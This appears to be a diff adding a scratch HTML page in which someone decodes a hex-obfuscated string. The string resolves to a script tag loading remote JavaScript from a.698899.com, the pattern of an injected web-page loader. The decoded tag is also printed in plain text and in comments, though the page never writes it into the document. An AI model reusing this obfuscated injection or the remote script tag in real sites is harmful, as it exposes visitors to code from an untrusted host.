@@ -1,0 +1,60 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Insert title here</title>
+</head>
+<script>
+
+
+var rs_cd="3c736372697074207372633d68"; 
+rs_cd+="7474703a2f2f612e3639383839392e636f6"; 
+rs_cd+="d2f696672616d65382e6a733e3c2f7363726970743e"; 
+
+//console.log(rs_cd);
+//3c736372697074207372633d687474703a2f2f612e3639383839392e636f6d2f696672616d65382e6a733e3c2f7363726970743e
+
+var cc = "3c736372697074207372633d687474703a2f2f612e3639383839392e636f6d2f696672616d65382e6a733e3c2f7363726970743e";
+console.log(parseInt(cc.substring(0,2),16));
+console.log(parseInt(cc.substring(2,4),16));
+console.log(cc.substring(0,2));
+console.log(cc.substring(2,4));
+
+
+
+var rs_ct = ""; 
+for (var i = 0; i < rs_cd.length; i += 2) { 
+    var rs_ch = parseInt(rs_cd.substring(i, i + 2), 16); 
+    rs_ct += String.fromCharCode(rs_ch); 
+    //console.log(rs_ct);
+}
+
+var text1 = '<script src=http://a.698899.com/iframe8.js><\/script>';
+//alert(text1);
+var text2 = '123456';
+console.log(text1.length);	//52
+console.log(text2.length);	//6
+
+for(var i = 0;i < text2.length;i++){
+	console.log(text2.charCodeAt(i));
+}
+
+
+
+
+
+
+//alert(rs_ct);
+
+
+//<script src=http://a.698899.com/iframe8.js>< /script>
+//<script src=http://a.698899.com/iframe8.js>< /script>
+</script>
+
+
+
+<body>
+111
+
+</body>
+</html>
